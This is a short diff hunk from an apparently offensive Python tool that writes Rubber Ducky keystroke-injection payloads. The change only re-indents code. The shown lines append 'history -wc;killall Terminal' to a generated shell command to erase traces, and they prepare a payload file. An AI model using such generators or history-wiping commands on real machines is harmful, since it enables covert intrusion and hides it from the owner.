@@ -19,11 +19,11 @@ class payload:
 			        else:
 				        h.info_error("invalid option: " + persistence)
 
-		      shell_command += "history -wc;killall Terminal"
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/rubber_duck") == False:
-			os.mkdir("payloads/rubber_duck")
+		        shell_command += "history -wc;killall Terminal"
+		        if os.path.exists("payloads") == False:
+			        os.mkdir("payloads")
+		        if os.path.exists("payloads/rubber_duck") == False:
+			        os.mkdir("payloads/rubber_duck")
 		payload_save_path = "payloads/rubber_duck/payload.txt"
 		payload = """\
     DELAY 10
